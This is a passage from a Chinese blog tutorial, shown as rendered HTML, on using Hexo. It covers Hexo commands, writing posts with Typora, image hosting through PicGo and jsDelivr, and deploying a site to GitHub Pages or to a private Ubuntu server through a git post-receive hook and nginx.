index.md</span><br></pre></td></tr></table></figure></div><h2 id="themes"><a href="#themes" class="headerlink" title="themes"></a>themes</h2><p>主题文件夹。Hexo 会根据主题来生成静态页面。<br>把下载好的主题放到themes文件夹中，在<code>_config.yml</code>中设置主题名称即可切换主题。</p><h1 id="Hexo命令"><a href="#Hexo命令" class="headerlink" title="Hexo命令"></a>Hexo命令</h1><p>这里只介绍几个常用命令，全部命令可以使用<code>hexo --help</code>查看，或者看官方<a href="https://hexo.io/zh-cn/docs/commands" target="_blank" rel="noopener">文档</a></p><h2 id="init"><a href="#init" class="headerlink" title="init"></a>init</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo init [folder]</span></span><br></pre></td></tr></table></figure></div><p>初始化一个网站。如果没有设置 <code>folder</code> ，Hexo 会默认在当前目录下建立网站。</p><h2 id="new"><a href="#new" class="headerlink" title="new"></a>new</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo new [layout] &lt;title&gt;</span></span><br></pre></td></tr></table></figure></div><p>新建一篇文章。如果没有设置 <code>layout</code> 的话，默认使用 <a href="https://hexo.io/zh-cn/docs/configuration" target="_blank" rel="noopener">_config.yml</a> 中的 <code>default_layout</code> 参数代替。</p><p>如果标题包含空格的话，需要用引号括起来：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo new post <span class="string">"post title with whitespace"</span></span></span><br></pre></td></tr></table></figure></div><p>可简写为：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo n</span></span><br></pre></td></tr></table></figure></div><h2 id="generate"><a href="#generate" class="headerlink" title="generate"></a>generate</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo generate</span></span><br></pre></td></tr></table></figure></div><p>生成静态文件。可简写为：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo g</span></span><br></pre></td></tr></table></figure></div><h2 id="server"><a href="#server" class="headerlink" title="server"></a>server</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo server [-i ip] [-p port]</span></span><br></pre></td></tr></table></figure></div><p>启动服务器。默认情况下，访问网址为： <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a></p><p>可简写为：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo s</span></span><br></pre></td></tr></table></figure></div><blockquote><p>很实用的命令，生成文章后可以先在本地开启server预览网页。</p></blockquote><h2 id="deploy"><a href="#deploy" class="headerlink" title="deploy"></a>deploy</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo deploy</span></span><br></pre></td></tr></table></figure></div><p>部署网站。可简写为：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo d</span></span><br></pre></td></tr></table></figure></div><h2 id="clean"><a href="#clean" class="headerlink" title="clean"></a>clean</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo clean</span></span><br></pre></td></tr></table></figure></div><p>清除缓存文件 (<code>db.json</code>) 和已生成的静态文件 (<code>public</code>)。</p><blockquote><p>在某些情况（尤其是更换主题后），如果发现对站点的更改无论如何也不生效，可能需要运行clean</p></blockquote><h1 id="更改主题"><a href="#更改主题" class="headerlink" title="更改主题"></a>更改主题</h1><p><code>hexo-theme-butterfly</code>是基于Molunerfinn的<code>hexo-theme-melody</code>的基础上进行开发的。</p><p>这个主题的帮助文档写的极为详细，快去看吧：</p><p><a href="https://jerryc.me/posts/21cfbf15/" target="_blank" rel="noopener">hexo-theme-butterfly安裝文檔</a></p><h1 id="写作"><a href="#写作" class="headerlink" title="写作"></a>写作</h1><p>Hexo中写文章用的是markdown语言，如果之前没接触过的话，可以看下面的文章快速入门：</p><p><a href="https://www.runoob.com/markdown/md-tutorial.html" target="_blank" rel="noopener">RUNOOB|Markdown 教程</a></p><h2 id="Typora"><a href="#Typora" class="headerlink" title="Typora"></a>Typora</h2><p><a href="https://typora.io/#download" target="_blank" rel="noopener">Typora</a>是一款很不错的Markdown书写软件，全平台支持（是我目前用过最好用的editor…）</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200212154756.png" data-fancybox="group" data-caption="20200212154756.png" class="fancybox"><img alt="20200212154756.png" title="20200212154756.png" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200212154756.png" src="/img/loading.gif" class="lazyload"></a></p><p>使用<code>hexo new</code>命令生成新文章后，可直接使用<code>typora</code>编辑：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo new post <span class="string">"test"</span></span></span><br><span class="line">INFO  Created: ~/blog/source/_posts/test.md</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> typora ~/blog/<span class="built_in">source</span>/_posts/test.md</span></span><br></pre></td></tr></table></figure></div><h2 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h2><p>写文章时，难免要在文章中插入图片，所以有必要稍微介绍一下，有关网站中图片资源的一些小技巧:D</p><h3 id="图床"><a href="#图床" class="headerlink" title="图床"></a>图床</h3><p><strong>PicGo:是一个用于快速上传图片并获取图片URL链接的工具</strong></p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200212163155.png" data-fancybox="group" data-caption="picGo" class="fancybox"><img alt="picGo" title="picGo" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200212163155.png" src="/img/loading.gif" class="lazyload"></a></p><p>简单的说（以Github图床为例）就是可以自动把图片上传到Github仓库，然后返回图片对应的url，写文章的时候，直接引用这个url即可插入图片。<a href="https://github.com/Molunerfinn/PicGo/releases" target="_blank" rel="noopener">下载链接</a></p><p>有关PicGo的图床配置，可以看这篇文章：</p><p><a href="https://www.jianshu.com/p/9d91355e8418" target="_blank" rel="noopener">图床工具的使用—PicGo</a></p><p>按照上面这篇文章的介绍，可以建立一个专门用于图片存储的Github的仓库</p><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>图床虽然搭建好了，但是由于Github的服务器不在国内，访问资源速度太慢，于是可以用免费的CDN加速</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200212162512.png" data-fancybox="group" data-caption="cdn" class="fancybox"><img alt="cdn" title="cdn" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200212162512.png" src="/img/loading.gif" class="lazyload"></a></p><p><a href="https://www.jsdelivr.com/" target="_blank" rel="noopener">jsDelivr</a> 为开发者提供免费公共 CDN 加速服务</p><p>使用起来很方便，只需要把Github中图片的url进行如下对应的改动即可：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> github url</span></span><br><span class="line">https://raw.githubusercontent.com/TaQini/CDN/master/img/20200212162512.png</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> jsdeliver url</span></span><br><span class="line">https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200212162512.png</span><br></pre></td></tr></table></figure></div><p>在markdown中插入该图片：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">markdown</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![<span class="string">cdn</span>](<span class="link">https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200212162512.png</span>)</span><br></pre></td></tr></table></figure></div><h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><p>这里介绍如何把生成好的网站部署到git服务器</p><p>首先要安装插件，在网站目录下执行以下命令：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npm install hexo-deployer-git --save</span></span><br></pre></td></tr></table></figure></div><h2 id="部署到GitHub-Page"><a href="#部署到GitHub-Page" class="headerlink" title="部署到GitHub Page"></a>部署到GitHub Page</h2><p>看这里超详细的：<a href="https://blog.csdn.net/grave2015/article/details/79961843" target="_blank" rel="noopener">超详细的hexo+githhub page搭建过程</a></p><p>其实倒也不用那么麻烦…..</p><h3 id="新建仓库"><a href="#新建仓库" class="headerlink" title="新建仓库"></a>新建仓库</h3><p>简单的说，就是在Github上新建一个仓库，仓库命名为<code>username.github.io</code></p><blockquote><p>username是你自己的github用户名，记得替换以下哦，下同</p></blockquote><p>如果是首次用git的话，要配置一下用户信息</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --<span class="keyword">global</span> user.name   <span class="string">"username"</span></span><br><span class="line">$ git config --<span class="keyword">global</span> user.email  <span class="string">"email"</span></span><br></pre></td></tr></table></figure></div><h3 id="修改-config-yml"><a href="#修改-config-yml" class="headerlink" title="修改_config.yml"></a>修改_config.yml</h3><p>然后直接改<code>_config.yml</code>末尾的部署配置：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yaml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">'git'</span></span><br><span class="line">  <span class="attr">repo:</span> </span><br><span class="line">    <span class="attr">github:</span> <span class="string">https://github.com/username/username.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure></div><h3 id="执行部署命令"><a href="#执行部署命令" class="headerlink" title="执行部署命令"></a>执行部署命令</h3><p>配置完，执行部署命令：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo d</span></span><br><span class="line">INFO  Deploying: git</span><br><span class="line">INFO  Clearing .deploy_git folder...</span><br><span class="line">INFO  Copying files from public folder...</span><br><span class="line">INFO  Copying files from extend dirs...</span><br><span class="line">On branch master</span><br><span class="line">nothing to commit, working tree clean</span><br><span class="line">Username for 'https://github.com': TaQini</span><br><span class="line">Password for 'https://username@github.com': &lt;input_your_password&gt;</span><br><span class="line">Enumerating objects: 294, done.</span><br><span class="line">Counting objects: 100% (294/294), done.</span><br><span class="line">Delta compression using up to 4 threads</span><br><span class="line">Compressing objects: 100% (202/202), done.</span><br><span class="line">Writing objects: 100% (294/294), 258.39 KiB | 9.94 MiB/s, done.</span><br><span class="line">Total 294 (delta 120), reused 0 (delta 0)</span><br><span class="line">remote: Resolving deltas: 100% (120/120), done.</span><br><span class="line">To https://github.com/username/username.github.io.git</span><br><span class="line"> * [new branch]      HEAD -&gt; gh-pages</span><br><span class="line">Branch 'master' set up to track remote branch 'gh-pages' from 'https://github.com/username/username.github.io.git'.</span><br></pre></td></tr></table></figure></div><p>最后，直接访问<a href="https://username.github.io" target="_blank" rel="noopener">https://username.github.io</a> 即可访问刚刚部署的网站</p><blockquote><p>这里是通过HTTP协议部署的，如果要用SSH，看开头的<a href="https://blog.csdn.net/grave2015/article/details/79961843" target="_blank" rel="noopener">超详细</a>文章即可</p></blockquote><h2 id="部署到私有服务器"><a href="#部署到私有服务器" class="headerlink" title="部署到私有服务器"></a>部署到私有服务器</h2><p>服务器以<code>Ubuntu 16.04</code>为例，（服务器应该差不多都是linux叭）</p><p>参考这里：<a href="https://www.jianshu.com/p/196773379a78" target="_blank" rel="noopener">如何在个人服务器上部署Hexo博客</a></p><blockquote><p><strong>大致思路:</strong></p><p>1 在云服务器上建立私人git服务器并配置本地仓库</p><p>2 在个人开发pc上下载hexo框架源码，并在配置文件中设置push到云服务器上的私人仓库。</p><p>3 pc打包上传hexo静态文件并上传到服务器上的私人仓库</p><p>4 仓库中设置git钩子将已上传的静态资源拷贝到自定义目录下</p><p>5 通过nginx部署web服务，配置静态资源访问目录到自定义目录。</p></blockquote><p>照着这个思路配置一下服务器即可。</p><p>先安装网页服务器吧，<code>apache</code>或者<code>nginx</code>之类的都可</p><h3 id="在服务器上安装网页服务器"><a href="#在服务器上安装网页服务器" class="headerlink" title="在服务器上安装网页服务器"></a>在服务器上安装网页服务器</h3><p>登录服务器，然后安装网页服务器：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install nginx</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 或者</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install apache2</span></span><br></pre></td></tr></table></figure></div><h3 id="在服务器上新建git用户"><a href="#在服务器上新建git用户" class="headerlink" title="在服务器上新建git用户"></a>在服务器上新建git用户</h3><p>创建<code>git</code>用户：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo adduser git</span></span><br><span class="line">Adding user `git' ...</span><br><span class="line">Adding new group `git' (1001) ...</span><br><span class="line">Adding new user `git' (1001) with group `git' ...</span><br><span class="line">Creating home directory `/home/git' ...</span><br><span class="line">Copying files from `/etc/skel' ...</span><br><span class="line">New password: &lt;set_your_password&gt;</span><br><span class="line">Retype new password: &lt;repeat_your_password&gt;</span><br><span class="line">passwd: password updated successfully</span><br><span class="line">Changing the user information for git</span><br><span class="line">Enter the new value, or press ENTER for the default</span><br><span class="line">Full Name []: </span><br><span class="line">Room Number []: </span><br><span class="line">Work Phone []: </span><br><span class="line">Home Phone []: </span><br><span class="line">Other []: </span><br><span class="line">Is the information correct? [Y/n] Y</span><br></pre></td></tr></table></figure></div><h3 id="在服务器上建立git服务器"><a href="#在服务器上建立git服务器" class="headerlink" title="在服务器上建立git服务器"></a>在服务器上建立git服务器</h3><h4 id="自定义个人git目录"><a href="#自定义个人git目录" class="headerlink" title="自定义个人git目录"></a>自定义个人git目录</h4><p>随便找一个目录，比如我在根目录下创建一个<code>/TaQini</code>文件夹作为我个人git的目录（里面存储配置文件）</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo mkdir /TaQini   <span class="comment"># 创建个人git目录</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> /TaQini</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo mkdir blog.git  <span class="comment"># 创建仓库</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> blog.git</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo git init --bare <span class="comment"># 初始化仓库</span></span></span><br></pre></td></tr></table></figure></div><h4 id="自定义git工作目录"><a href="#自定义git工作目录" class="headerlink" title="自定义git工作目录"></a>自定义git工作目录</h4><p>再随便找一个目录，作为git仓库的工作目录（上传的代码会存储在工作目录中）</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo mkdir -p /var/www/hexo</span></span><br></pre></td></tr></table></figure></div><h4 id="目录权限变更"><a href="#目录权限变更" class="headerlink" title="目录权限变更"></a>目录权限变更</h4><p>把刚刚自定义的两个目录的权限给<code>git</code>用户：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo chown -R git:git /TaQini /var/www/hexo</span></span><br></pre></td></tr></table></figure></div><h4 id="配置git服务器"><a href="#配置git服务器" class="headerlink" title="配置git服务器"></a>配置git服务器</h4><p>切换到的<code>git</code>用户，密码就是刚才设置的密码：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ su git</span><br><span class="line">Password:&lt;input_your_password&gt;</span><br></pre></td></tr></table></figure></div><p>编辑hook函数，并输入以下内容(刚才新建的两个目录)：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> vim /TaQini/blog.git/hooks/post-receive</span></span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">git --work-tree=/var/www/hexo --git-dir=/TaQini/blog.git checkout -f</span><br></pre></td></tr></table></figure></div><p>添加可执行权限</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ chmod +x /TaQini/blog.git/hooks/post-receive</span><br><span class="line">$ <span class="built_in">exit</span> <span class="comment"># 退出git用户</span></span><br></pre></td></tr></table></figure></div><h4 id="测试git仓库是否可用"><a href="#测试git仓库是否可用" class="headerlink" title="测试git仓库是否可用"></a>测试git仓库是否可用</h4><p>在本地执行<code>git clone</code>命令，如果能把仓库拉下来，就说明git服务器搭建成功：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> git@your_server_ip:/TaQini/blog.git</span><br><span class="line">Cloning into <span class="string">'blog'</span>...</span><br><span class="line">git@your_server_ip<span class="string">'s password: &lt;your_git_password&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>your_server_ip：服务器的ip地址<br>your_git_password：服务器git用户的密码</p></blockquote><h3 id="禁用服务器git用户登录权限"><a href="#禁用服务器git用户登录权限" class="headerlink" title="禁用服务器git用户登录权限"></a>禁用服务器git用户登录权限</h3><p>现在<code>git</code>用户的默认shell是<code>/bin/bash</code>，为了安全，需要禁用 <code>git</code> 用户的 shell 登录权限</p><p>方法是将<code>git</code>用户的shell改为其专用的<code>git-shell</code>：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat /etc/shells <span class="comment"># 查看 git-shell 是否在登录方式里面</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">which</span> git-shell <span class="comment"># 查看git-shell路径</span></span></span><br><span class="line">/usr/bin/git-shell</span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo vim /etc/shells <span class="comment"># 将/usr/bin/git-shell添加进去</span></span></span><br></pre></td></tr></table></figure></div><p>然后修改git用户的shell：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo vim /etc/passwd</span></span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 将/bin/bash修改为/usr/bin/git-shell</span></span><br><span class="line">git:x:1001:1001:,,,:/home/git:/usr/bin/git-shell</span><br></pre></td></tr></table></figure></div><p>最后在本地执行以下命令，检测服务器git用户登录权限是否禁用：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ssh git@your_server_ip</span></span><br><span class="line">git@your_server_ip's password: &lt;your_git_password&gt;</span><br><span class="line">Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-93-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line">New release '18.04.3 LTS' available.</span><br><span class="line">Run 'do-release-upgrade' to upgrade to it.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Welcome to Alibaba Cloud Elastic Compute Service !</span><br><span class="line"></span><br><span class="line">fatal: Interactive git shell is not enabled.</span><br><span class="line">hint: ~/git-shell-commands should exist and have read and execute access.</span><br><span class="line">Connection to your_server_ip closed.</span><br></pre></td></tr></table></figure></div><p>如果提示<code>fatal: Interactive git shell is not enabled.</code>，则表示禁用成功。</p><h3 id="配置网页服务器"><a href="#配置网页服务器" class="headerlink" title="配置网页服务器"></a>配置网页服务器</h3><p>以<code>nginx</code>为例：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa 